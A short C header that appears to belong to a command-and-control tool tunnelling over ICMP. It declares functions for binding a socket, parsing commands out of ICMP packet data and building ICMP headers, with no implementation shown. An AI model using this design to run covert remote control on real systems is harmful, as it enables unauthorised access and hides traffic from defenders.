#ifndef C2_H
#define C2_H
#include <stdint.h>
#include <linux/icmp.h>

void c2_init_n_call(char *interface_to_bind);
int create_socket(char *inteface_to_bind);
void interact(int sockfd);
void print_connection_succeed(char *src_ip);
unsigned char *get_command(char *input);
unsigned char *parse_data_section(unsigned char *packet);
void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum);

#endif